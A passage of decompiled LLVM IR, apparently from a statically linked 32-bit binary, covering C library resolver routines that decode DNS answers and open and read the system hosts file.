  store i8 %v3_8067bb5, i8* %v3_8067bbc, align 1
  %v0_8067bbe = load i32, i32* @esi, align 4
  %v1_8067bbe = add i32 %v0_8067bbe, 4
  %v2_8067bbe = inttoptr i32 %v1_8067bbe to i32*
  %v3_8067bbe = load i32, i32* %v2_8067bbe, align 4
  %v1_8067bc1 = trunc i32 %v3_8067bbe to i8
  %v2_8067bc1 = load i32, i32* @edx, align 4
  %v3_8067bc1 = add i32 %v2_8067bc1, 1
  %v4_8067bc1 = inttoptr i32 %v3_8067bc1 to i8*
  store i8 %v1_8067bc1, i8* %v4_8067bc1, align 1
  %v0_8067bc4 = load i32, i32* @esi, align 4
  %v1_8067bc4 = add i32 %v0_8067bc4, 9
  %v2_8067bc4 = inttoptr i32 %v1_8067bc4 to i8*
  %v3_8067bc4 = load i8, i8* %v2_8067bc4, align 1
  %v2_8067bc8 = load i32, i32* @edx, align 4
  %v3_8067bc8 = add i32 %v2_8067bc8, 2
  %v4_8067bc8 = inttoptr i32 %v3_8067bc8 to i8*
  store i8 %v3_8067bc4, i8* %v4_8067bc8, align 1
  %v0_8067bcb = load i32, i32* @esi, align 4
  %v1_8067bcb = add i32 %v0_8067bcb, 8
  %v2_8067bcb = inttoptr i32 %v1_8067bcb to i32*
  %v3_8067bcb = load i32, i32* %v2_8067bcb, align 4
  %v1_8067bce = trunc i32 %v3_8067bcb to i8
  %v2_8067bce = load i32, i32* @edx, align 4
  %v3_8067bce = add i32 %v2_8067bce, 3
  %v4_8067bce = inttoptr i32 %v3_8067bce to i8*
  store i8 %v1_8067bce, i8* %v4_8067bce, align 1
  %v0_8067bd2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8067bd1

dec_label_pc_8067bd1:                             ; preds = %entry, %dec_label_pc_8067bad, %dec_label_pc_8067bb2
  %v0_8067bd2 = phi i32 [ %v8_8067b98, %entry ], [ -1, %dec_label_pc_8067bad ], [ %v0_8067bd2.pre, %dec_label_pc_8067bb2 ]
  %v2_8067bd1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8067bd1, i32* @ebx, align 4
  store i32 %v0_8067b84, i32* @edi, align 4
  ret i32 %v0_8067bd2

; uselistorder directives
  uselistorder i32 %v1_8067ba8, { 1, 0 }
  uselistorder i32 %v2_8067ba6, { 0, 2, 1 }
  uselistorder i32 %v8_8067b98, { 1, 2, 0, 4, 5, 3 }
  uselistorder i32 -3, { 2, 0, 6, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8067bd1, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8067be3 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8067be8 = icmp slt i32 %v2_8067be3, 0
  %v1_8067bea = add i32 %v2_8067be3, 4
  %v1_8067bed = icmp eq i1 %v2_8067be8, false
  %v4_8067bed = select i1 %v1_8067bed, i32 %v1_8067bea, i32 %v2_8067be3
  ret i32 %v4_8067bed

; uselistorder directives
  uselistorder i32 %v2_8067be3, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8067bf4 = load i32, i32* @ebp, align 4
  %v0_8067bf5 = load i32, i32* @edi, align 4
  %v0_8067bf6 = load i32, i32* @esi, align 4
  %v0_8067bf7 = load i32, i32* @ebx, align 4
  store i32 %v0_8067bf7, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8067c18 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8067c18, i32* %eax.global-to-local, align 4
  %v4_8067c25 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8067c18, i32 256)
  store i32 %v4_8067c25, i32* %eax.global-to-local, align 4
  %v3_8067c2d = icmp slt i32 %v4_8067c25, 0
  store i32 %v4_8067c25, i32* @edi, align 4
  br i1 %v3_8067c2d, label %dec_label_pc_8067ce0, label %dec_label_pc_8067c37

dec_label_pc_8067c37:                             ; preds = %entry
  %v0_8067c37 = load i32, i32* @ebx, align 4
  %v3_8067c37 = add i32 %v0_8067c37, %v4_8067c25
  %v0_8067c39 = load i32, i32* @esi, align 4
  %v2_8067c39 = sub i32 %v0_8067c39, %v3_8067c37
  %v1_8067c3b = add i32 %v2_8067c39, -10
  %v10_8067c3b = icmp slt i32 %v1_8067c3b, 0
  store i32 %v1_8067c3b, i32* @esi, align 4
  %v1_8067c46 = icmp eq i1 %v10_8067c3b, false
  br i1 %v1_8067c46, label %dec_label_pc_8067c4f, label %dec_label_pc_8067c48

dec_label_pc_8067c48:                             ; preds = %dec_label_pc_8067c37
  br label %dec_label_pc_8067ce0

dec_label_pc_8067c4f:                             ; preds = %dec_label_pc_8067c37
  %v6_8067c56 = add i32 %v3_8067c37, %tmp4
  store i32 %v6_8067c56, i32* @ebx, align 4
  store i32 %v2_8067c18, i32* %eax.global-to-local, align 4
  %v1_8067c62 = bitcast i32* %stack_var_-272 to i8*
  %v2_8067c62 = call i32 @__GI_strdup(i8* %v1_8067c62)
  store i32 %v2_8067c62, i32* %eax.global-to-local, align 4
  %v0_8067c67 = load i32, i32* @ebx, align 4
  %v1_8067c67 = add i32 %v0_8067c67, 4
  store i32 %v1_8067c67, i32* %esi.global-to-local, align 4
  %v1_8067c6a = load i32, i32* @ebp, align 4
  %v2_8067c6a = inttoptr i32 %v1_8067c6a to i32*
  store i32 %v2_8067c62, i32* %v2_8067c6a, align 4
  %v0_8067c6d = load i32, i32* @ebx, align 4
  %v1_8067c6d = inttoptr i32 %v0_8067c6d to i8*
  %v2_8067c6d = load i8, i8* %v1_8067c6d, align 1
  %v3_8067c6d = zext i8 %v2_8067c6d to i32
  store i32 %v3_8067c6d, i32* %eax.global-to-local, align 4
  %v1_8067c70 = add i32 %v0_8067c6d, 1
  %v2_8067c70 = inttoptr i32 %v1_8067c70 to i8*
  %v3_8067c70 = load i8, i8* %v2_8067c70, align 1
  %v4_8067c70 = zext i8 %v3_8067c70 to i32
  store i32 %v4_8067c70, i32* %edx.global-to-local, align 4
  %v2_8067c74 = mul nuw nsw i32 %v3_8067c6d, 256
  %v2_8067c77 = or i32 %v4_8067c70, %v2_8067c74
  store i32 %v2_8067c77, i32* %eax.global-to-local, align 4
  %v1_8067c79 = load i32, i32* @ebp, align 4
  %v2_8067c79 = add i32 %v1_8067c79, 4
  %v3_8067c79 = inttoptr i32 %v2_8067c79 to i32*
  store i32 %v2_8067c77, i32* %v3_8067c79, align 4
  %v0_8067c7c = load i32, i32* @ebx, align 4
  %v1_8067c7c = add i32 %v0_8067c7c, 2
  %v2_8067c7c = inttoptr i32 %v1_8067c7c to i8*
  %v3_8067c7c = load i8, i8* %v2_8067c7c, align 1
  %v4_8067c7c = zext i8 %v3_8067c7c to i32
  store i32 %v4_8067c7c, i32* %eax.global-to-local, align 4
  %v1_8067c80 = add i32 %v0_8067c7c, 3
  %v2_8067c80 = inttoptr i32 %v1_8067c80 to i8*
  %v3_8067c80 = load i8, i8* %v2_8067c80, align 1
  %v4_8067c80 = zext i8 %v3_8067c80 to i32
  store i32 %v4_8067c80, i32* %edx.global-to-local, align 4
  %v2_8067c84 = mul nuw nsw i32 %v4_8067c7c, 256
  %v2_8067c87 = or i32 %v4_8067c80, %v2_8067c84
  store i32 %v2_8067c87, i32* %eax.global-to-local, align 4
  %v1_8067c89 = load i32, i32* @ebp, align 4
  %v2_8067c89 = add i32 %v1_8067c89, 8
  %v3_8067c89 = inttoptr i32 %v2_8067c89 to i32*
  store i32 %v2_8067c87, i32* %v3_8067c89, align 4
  %v0_8067c8c = load i32, i32* @ebx, align 4
  %v1_8067c8c = add i32 %v0_8067c8c, 4
  %v2_8067c8c = inttoptr i32 %v1_8067c8c to i8*
  %v3_8067c8c = load i8, i8* %v2_8067c8c, align 1
  %v4_8067c8c = zext i8 %v3_8067c8c to i32
  store i32 %v4_8067c8c, i32* %edx.global-to-local, align 4
  %v0_8067c90 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067c90 = add i32 %v0_8067c90, 1
  %v2_8067c90 = inttoptr i32 %v1_8067c90 to i8*
  %v3_8067c90 = load i8, i8* %v2_8067c90, align 1
  %v4_8067c90 = zext i8 %v3_8067c90 to i32
  store i32 %v4_8067c90, i32* %eax.global-to-local, align 4
  %v1_8067c94 = add i32 %v0_8067c90, 2
  %v2_8067c94 = inttoptr i32 %v1_8067c94 to i8*
  %v3_8067c94 = load i8, i8* %v2_8067c94, align 1
  %v4_8067c94 = zext i8 %v3_8067c94 to i32
  %v2_8067c98 = mul nuw i32 %v4_8067c8c, 16777216
  %v2_8067c9b = mul nuw nsw i32 %v4_8067c90, 65536
  store i32 %v2_8067c9b, i32* %eax.global-to-local, align 4
  %v2_8067c9e = or i32 %v2_8067c9b, %v2_8067c98
  store i32 %v2_8067c9e, i32* %edx.global-to-local, align 4
  %v1_8067ca0 = add i32 %v0_8067c90, 3
  %v2_8067ca0 = inttoptr i32 %v1_8067ca0 to i8*
  %v3_8067ca0 = load i8, i8* %v2_8067ca0, align 1
  %v4_8067ca0 = zext i8 %v3_8067ca0 to i32
  store i32 %v4_8067ca0, i32* %eax.global-to-local, align 4
  %v2_8067ca4 = mul nuw nsw i32 %v4_8067c94, 256
  %v2_8067ca7 = or i32 %v4_8067ca0, %v2_8067c9e
  store i32 %v2_8067ca7, i32* %edx.global-to-local, align 4
  %v2_8067ca9 = or i32 %v2_8067ca7, %v2_8067ca4
  store i32 %v2_8067ca9, i32* @ecx, align 4
  %v1_8067cab = load i32, i32* @ebp, align 4
  %v2_8067cab = add i32 %v1_8067cab, 12
  %v3_8067cab = inttoptr i32 %v2_8067cab to i32*
  store i32 %v2_8067ca9, i32* %v3_8067cab, align 4
  %v0_8067cae = load i32, i32* @ebx, align 4
  %v1_8067cae = add i32 %v0_8067cae, 8
  %v2_8067cae = inttoptr i32 %v1_8067cae to i8*
  %v3_8067cae = load i8, i8* %v2_8067cae, align 1
  %v4_8067cae = zext i8 %v3_8067cae to i32
  store i32 %v4_8067cae, i32* %edx.global-to-local, align 4
  %v1_8067cb2 = add i32 %v0_8067cae, 9
  %v2_8067cb2 = inttoptr i32 %v1_8067cb2 to i8*
  %v3_8067cb2 = load i8, i8* %v2_8067cb2, align 1
  %v4_8067cb2 = zext i8 %v3_8067cb2 to i32
  store i32 %v4_8067cb2, i32* %eax.global-to-local, align 4
  %v1_8067cb6 = add i32 %v0_8067cae, 10
  %v1_8067cb9 = load i32, i32* @ebp, align 4
  %v2_8067cb9 = add i32 %v1_8067cb9, 20
  %v3_8067cb9 = inttoptr i32 %v2_8067cb9 to i32*
  store i32 %v1_8067cb6, i32* %v3_8067cb9, align 4
  %v0_8067cbc = load i32, i32* %edx.global-to-local, align 4
  %v2_8067cbc = mul i32 %v0_8067cbc, 256
  %v1_8067cbf = load i32, i32* %eax.global-to-local, align 4
  %v2_8067cbf = or i32 %v1_8067cbf, %v2_8067cbc
  store i32 %v2_8067cbf, i32* @edx, align 4
  %v1_8067cc1 = load i32, i32* @ebp, align 4
  %v2_8067cc1 = add i32 %v1_8067cc1, 16
  %v3_8067cc1 = inttoptr i32 %v2_8067cc1 to i32*
  store i32 %v2_8067cbf, i32* %v3_8067cc1, align 4
  %v1_8067ccb = add i32 %v3_8067c37, 10
  store i32 %v1_8067ccb, i32* %eax.global-to-local, align 4
  %v1_8067cce = load i32, i32* @ebp, align 4
  %v2_8067cce = add i32 %v1_8067cce, 24
  %v3_8067cce = inttoptr i32 %v2_8067cce to i32*
  store i32 %v1_8067ccb, i32* %v3_8067cce, align 4
  %v4_8067cd1 = load i32, i32* @edx, align 4
  %v5_8067cd5 = icmp slt i32 %v1_8067c3b, %v4_8067cd1
  br i1 %v5_8067cd5, label %dec_label_pc_8067cd7, label %dec_label_pc_8067cdc

dec_label_pc_8067cd7:                             ; preds = %dec_label_pc_8067c4f
  br label %dec_label_pc_8067ce0

dec_label_pc_8067cdc:                             ; preds = %dec_label_pc_8067c4f
  %v1_8067cdc = load i32, i32* @edi, align 4
  %v2_8067cdc = add i32 %v4_8067cd1, 10
  %v3_8067cdc = add i32 %v2_8067cdc, %v1_8067cdc
  br label %dec_label_pc_8067ce0

dec_label_pc_8067ce0:                             ; preds = %entry, %dec_label_pc_8067cd7, %dec_label_pc_8067c48, %dec_label_pc_8067cdc
  %v0_8067ce6 = phi i32 [ %v4_8067c25, %entry ], [ -1, %dec_label_pc_8067cd7 ], [ %v1_8067c3b, %dec_label_pc_8067c48 ], [ %v3_8067cdc, %dec_label_pc_8067cdc ]
  store i32 %v0_8067ce6, i32* %eax.global-to-local, align 4
  %v2_8067ce8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8067ce8, i32* @ebx, align 4
  store i32 %v0_8067bf6, i32* @esi, align 4
  store i32 %v0_8067bf5, i32* @edi, align 4
  store i32 %v0_8067bf4, i32* @ebp, align 4
  ret i32 %v0_8067ce6

; uselistorder directives
  uselistorder i32 %v0_8067ce6, { 1, 0 }
  uselistorder i32 %v2_8067c9b, { 1, 0 }
  uselistorder i32 %v1_8067c3b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8067c37, { 1, 0, 2 }
  uselistorder i32 %v4_8067c25, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8067c18, { 1, 0, 2 }
  uselistorder i32 24, { 8, 9, 17, 0, 16, 10, 11, 12, 18, 3, 4, 2, 15, 26, 13, 19, 20, 21, 22, 23, 24, 25, 28, 1, 14, 5, 6, 7, 27, 30, 29 }
  uselistorder i32 9, { 9, 10, 11, 12, 14, 15, 13, 1, 7, 0, 3, 2, 16, 17, 18, 19, 8, 20, 4, 5, 6 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5 }
  uselistorder i32 3, { 30, 31, 32, 33, 34, 35, 16, 41, 0, 36, 21, 2, 1, 3, 39, 40, 22, 13, 23, 27, 20, 29, 28, 42, 17, 18, 26, 11, 12, 10, 24, 4, 14, 15, 5, 6, 7, 8, 25, 37, 38, 9, 19 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder i32 256, { 5, 6, 7, 8, 40, 9, 10, 11, 12, 13, 14, 15, 39, 16, 17, 18, 19, 20, 0, 1, 21, 2, 41, 22, 23, 24, 25, 4, 44, 45, 3, 26, 27, 28, 29, 30, 31, 32, 42, 33, 34, 35, 36, 37, 38, 43, 46 }
  uselistorder label %dec_label_pc_8067ce0, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8067cfd = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_806f65e.873 to i32), i32 ptrtoint (i32* @global_var_806f591.835 to i32))
  store i32 %v3_8067cfd, i32* @eax, align 4
  %v1_8067d05 = icmp eq i32 %v3_8067cfd, 0
  %v1_8067d07 = icmp eq i1 %v1_8067d05, false
  br i1 %v1_8067d07, label %dec_label_pc_8067d1d, label %dec_label_pc_8067d09

dec_label_pc_8067d09:                             ; preds = %entry
  %v3_8067d15 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_806f669.874 to i32), i32 ptrtoint (i32* @global_var_806f591.835 to i32))
  br label %dec_label_pc_8067d1d

dec_label_pc_8067d1d:                             ; preds = %entry, %dec_label_pc_8067d09
  %v0_8067d20 = phi i32 [ %v3_8067cfd, %entry ], [ %v3_8067d15, %dec_label_pc_8067d09 ]
  ret i32 %v0_8067d20

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_806f591.835 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8067d1d, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8067d21 = load i32, i32* @ebp, align 4
  %v0_8067d22 = load i32, i32* @edi, align 4
  %v0_8067d23 = load i32, i32* @esi, align 4
  %v0_8067d24 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8067d32 = sub i32 0, %arg6
  %v1_8067d34 = urem i32 %v1_8067d32, 4
  %v2_8067d34 = icmp eq i32 %v1_8067d34, 0
  store i32 %v1_8067d34, i32* %eax.global-to-local, align 4
  br i1 %v2_8067d34, label %dec_label_pc_8067d45, label %dec_label_pc_8067d39

dec_label_pc_8067d39:                             ; preds = %entry
  %v2_8067d39 = sub i32 %arg7, %v1_8067d34
  %v7_8067d39 = icmp ugt i32 %v1_8067d34, %arg7
  br i1 %v7_8067d39, label %dec_label_pc_8067fe9, label %dec_label_pc_8067d41

dec_label_pc_8067d41:                             ; preds = %dec_label_pc_8067d39
  %v2_8067d41 = add i32 %v1_8067d34, %arg6
  store i32 %v2_8067d41, i32* @ebx, align 4
  store i32 %v2_8067d39, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8067d45

dec_label_pc_8067d45:                             ; preds = %entry, %dec_label_pc_8067d41
  %v0_8067d53 = phi i32 [ %arg6, %entry ], [ %v2_8067d41, %dec_label_pc_8067d41 ]
  %v0_8067d5a = phi i32 [ %arg7, %entry ], [ %v2_8067d39, %dec_label_pc_8067d41 ]
  %tmp = icmp ult i32 %v0_8067d5a, 32
  br i1 %tmp, label %dec_label_pc_8067fe9, label %dec_label_pc_8067d4e

dec_label_pc_8067d4e:                             ; preds = %dec_label_pc_8067d45
  %v12_8067d4e = icmp eq i32 %arg4, 1
  %v1_8067d53 = add i32 %v0_8067d53, 32
  store i32 %v1_8067d53, i32* %eax.global-to-local, align 4
  %v1_8067d5a = add i32 %v0_8067d5a, -32
  store i32 %v1_8067d5a, i32* @ebp, align 4
  br i1 %v12_8067d4e, label %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge, label %dec_label_pc_8067d63

dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge: ; preds = %dec_label_pc_8067d4e
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8067e99

dec_label_pc_8067d63:                             ; preds = %dec_label_pc_8067d4e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8067d6a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8067d6a, align 4
  %tmp156 = icmp ult i32 %v1_8067d5a, 4
  br i1 %tmp156, label %dec_label_pc_8067fe9, label %dec_label_pc_8067d76

dec_label_pc_8067d76:                             ; preds = %dec_label_pc_8067d63
  %v0_8067d76 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067d76 = add i32 %v0_8067d76, -36
  store i32 %v1_8067d76, i32* %eax.global-to-local, align 4
  %tmp157 = icmp ult i32 %v1_8067d76, 8
  br i1 %tmp157, label %dec_label_pc_8067fe9, label %dec_label_pc_8067d82

dec_label_pc_8067d82:                             ; preds = %dec_label_pc_8067d76
  %v0_8067d82 = load i32, i32* @ebp, align 4
  %tmp158 = icmp ult i32 %v0_8067d82, 16
  br i1 %tmp158, label %dec_label_pc_8067fe9, label %dec_label_pc_8067d8b

dec_label_pc_8067d8b:                             ; preds = %dec_label_pc_8067d82
  %v1_8067d8b = add i32 %v0_8067d76, -48
  store i32 %v1_8067d8b, i32* %eax.global-to-local, align 4
  %tmp159 = icmp ult i32 %v1_8067d8b, 8
  br i1 %tmp159, label %dec_label_pc_8067fe9, label %dec_label_pc_8067d97

dec_label_pc_8067d97:                             ; preds = %dec_label_pc_8067d8b
  %v0_8067d97 = load i32, i32* @ebx, align 4
  %v1_8067d97 = add i32 %v0_8067d97, 48
  %v1_8067d9a = add i32 %v0_8067d76, -44
  store i32 %v1_8067d9a, i32* @ebp, align 4
  %v1_8067da1 = add i32 %v0_8067d76, -56
  store i32 %v1_8067da1, i32* @eax, align 4
  %v7_8067da4 = icmp ult i32 %v1_8067da1, %v1_8067d9a
  %v1_8067da6 = add i32 %v0_8067d97, 36
  store i32 %v1_8067da6, i32* @edi, align 4
  br i1 %v7_8067da4, label %dec_label_pc_8067db0, label %dec_label_pc_8067dab

dec_label_pc_8067dab:                             ; preds = %dec_label_pc_8067d97
  %v1_8067dab = add i32 %v0_8067d97, 44
  store i32 %v1_8067dab, i32* @esi, align 4
  br label %dec_label_pc_8067db5

dec_label_pc_8067db0:                             ; preds = %dec_label_pc_8067d97
  %v1_8067db0 = add i32 %v0_8067d97, 56
  store i32 %v1_8067db0, i32* @esi, align 4
  store i32 %v1_8067da1, i32* @ebp, align 4
  br label %dec_label_pc_8067db5

dec_label_pc_8067db5:                             ; preds = %dec_label_pc_8067dab, %dec_label_pc_8067db0
  %v0_8067db5 = phi i32 [ %v1_8067d9a, %dec_label_pc_8067dab ], [ %v1_8067da1, %dec_label_pc_8067db0 ]
  %tmp160 = icmp ult i32 %v0_8067db5, 80
  br i1 %tmp160, label %dec_label_pc_8067fe9, label %dec_label_pc_8067dbe

dec_label_pc_8067dbe:                             ; preds = %dec_label_pc_8067db5
  %v0_8067dbe = call i32 @__open_etc_hosts()
  store i32 %v0_8067dbe, i32* %eax.global-to-local, align 4
  %v1_8067dc3 = icmp eq i32 %v0_8067dbe, 0
  br i1 %v1_8067dc3, label %dec_label_pc_8067deb, label %dec_label_pc_8067dcb

dec_label_pc_8067dcb:                             ; preds = %dec_label_pc_8067dbe
  store i32 %v1_8067d53, i32* %edx.global-to-local, align 4
  store i32 %v1_8067d97, i32* %eax.global-to-local, align 4
  %v0_8067dd3 = load i32, i32* @edi, align 4
  %v0_8067dd7 = load i32, i32* @esi, align 4
  %v4_8067ddb = inttoptr i32 %v1_8067d53 to i8*
  br label %dec_label_pc_8067e99

dec_label_pc_8067deb:                             ; preds = %dec_label_pc_8067dbe
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8067def = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8067def, align 4
  %v1_8067df5 = call i32 @__errno_location(i32 0)
  store i32 %v1_8067df5, i32* %eax.global-to-local, align 4
  %v1_8067dfa = inttoptr i32 %v1_8067df5 to i32*
  %v2_8067dfa = load i32, i32* %v1_8067dfa, align 4
  store i32 %v2_8067dfa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067fe9

dec_label_pc_8067e05:                             ; preds = %dec_label_pc_8067f6c
  %v2_8067e05 = load i8*, i8** %stack_var_-44, align 4
  %v3_8067e05 = ptrtoint i8* %v2_8067e05 to i32
  store i32 %v3_8067e05, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8067e0c = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8067e05, i32* %v2_8067e0c, align 4
  %v0_8067e0e = load i32, i32* %eax.global-to-local, align 4
  %v1_8067e0e = add i32 %v0_8067e0e, 4
  %v2_8067e0e = inttoptr i32 %v1_8067e0e to i32*
  store i32 0, i32* %v2_8067e0e, align 4
  %v0_8067e15 = load i32, i32* @ebx, align 4
  %v1_8067e15 = add i32 %v0_8067e15, 4
  %v2_8067e15 = inttoptr i32 %v1_8067e15 to i32*
  %v3_8067e15 = load i32, i32* %v2_8067e15, align 4
  store i32 %v3_8067e15, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8067e15, i32* %arg5, align 4
  %v1_8067e1e = add i32 %tmp60, 8
  %v2_8067e1e = inttoptr i32 %v1_8067e1e to i32*
  store i32 2, i32* %v2_8067e1e, align 4
  %v0_8067e25 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067e25 = add i32 %v0_8067e25, 12
  %v2_8067e25 = inttoptr i32 %v1_8067e25 to i32*
  store i32 4, i32* %v2_8067e25, align 4
  br label %dec_label_pc_8067e5e

dec_label_pc_8067e32:                             ; preds = %dec_label_pc_8067f8e
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8067e3a = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8067e3a, align 4
  %v0_8067e3c = load i32, i32* %edx.global-to-local, align 4
  %v1_8067e3c = add i32 %v0_8067e3c, 4
  %v2_8067e3c = inttoptr i32 %v1_8067e3c to i32*
  store i32 0, i32* %v2_8067e3c, align 4
  %v0_8067e43 = load i32, i32* @ebx, align 4
  %v1_8067e43 = add i32 %v0_8067e43, 4
  %v2_8067e43 = inttoptr i32 %v1_8067e43 to i32*
  %v3_8067e43 = load i32, i32* %v2_8067e43, align 4
  store i32 %v3_8067e43, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8067e43, i32* %arg5, align 4
  %v1_8067e4c = add i32 %tmp60, 8
  %v2_8067e4c = inttoptr i32 %v1_8067e4c to i32*
  store i32 10, i32* %v2_8067e4c, align 4
  %v0_8067e53 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067e53 = add i32 %v0_8067e53, 12
  %v2_8067e53 = inttoptr i32 %v1_8067e53 to i32*
  store i32 16, i32* %v2_8067e53, align 4
  br label %dec_label_pc_8067e5e

dec_label_pc_8067e5e:                             ; preds = %dec_label_pc_8067e05, %dec_label_pc_8067e32
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8067e05 ], [ %storemerge3, %dec_label_pc_8067e32 ]
  %v1_8067e5e = load i32, i32* %edx.global-to-local, align 4
  %v2_8067e5e = add i32 %v1_8067e5e, 16
  %v3_8067e5e = inttoptr i32 %v2_8067e5e to i32*
  store i32 %storemerge, i32* %v3_8067e5e, align 4
  %v0_8067e61 = load i32, i32* @ebx, align 4
  %v1_8067e61 = add i32 %v0_8067e61, 8
  %v1_8067e64 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067e64 = add i32 %v1_8067e64, 4
  %v3_8067e64 = inttoptr i32 %v2_8067e64 to i32*
  store i32 %v1_8067e61, i32* %v3_8067e64, align 4
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v0_8067e6b = load i32, i32* %edx.global-to-local, align 4
  %v2_8067e6b = inttoptr i32 %arg8 to i32*
  store i32 %v0_8067e6b, i32* %v2_8067e6b, align 4
  br label %dec_label_pc_8067fc9

dec_label_pc_8067e99:                             ; preds = %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge, %dec_label_pc_8067dcb
  %v1_8067e9d.pre-phi = phi i32* [ %.pre, %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge ], [ %v1_8067d6a, %dec_label_pc_8067dcb ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge ], [ %v4_8067ddb, %dec_label_pc_8067dcb ]
  %stack_var_-20.0.in = phi i32 [ %v1_8067d53, %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge ], [ %v0_8067dd7, %dec_label_pc_8067dcb ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge ], [ %v1_8067d53, %dec_label_pc_8067dcb ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge ], [ %v0_8067dd3, %dec_label_pc_8067dcb ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge ], [ %v0_8067dbe, %dec_label_pc_8067dcb ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8067d4e.dec_label_pc_8067e99_crit_edge ], [ %v1_8067d97, %dec_label_pc_8067dcb ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8067e9d.pre-phi, align 4
  %v2_8067f52 = inttoptr i32 %arg2 to i8*
  %v0_8067faf125133 = load i32, i32* @edx, align 4
  %v3_8067fb9126134 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8067faf125133)
  store i32 %v3_8067fb9126134, i32* %eax.global-to-local, align 4
  %v1_8067fc1127135 = icmp eq i32 %v3_8067fb9126134, 0
  %v1_8067fc3129137 = icmp eq i1 %v1_8067fc1127135, false
  br i1 %v1_8067fc3129137, label %dec_label_pc_8067eb0.lr.ph.lr.ph, label %dec_label_pc_8067fc9

dec_label_pc_8067eb0.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8067e99
  %v12_8067f87 = icmp eq i32 %arg3, 10
  %v12_8067f65 = icmp eq i32 %arg3, 2
  %v12_8067f27 = icmp eq i32 %arg4, 2
  %v1_8067f31 = icmp eq i1 %v12_8067f27, false
  %v1_8067f6a = icmp eq i1 %v12_8067f65, false
  %v1_8067f8c = icmp eq i1 %v12_8067f87, false
  br label %dec_label_pc_8067eb0.lr.ph

dec_label_pc_8067eb0.lr.ph:                       ; preds = %dec_label_pc_8067eb0.lr.ph.lr.ph, %dec_label_pc_8067faf.outer.backedge
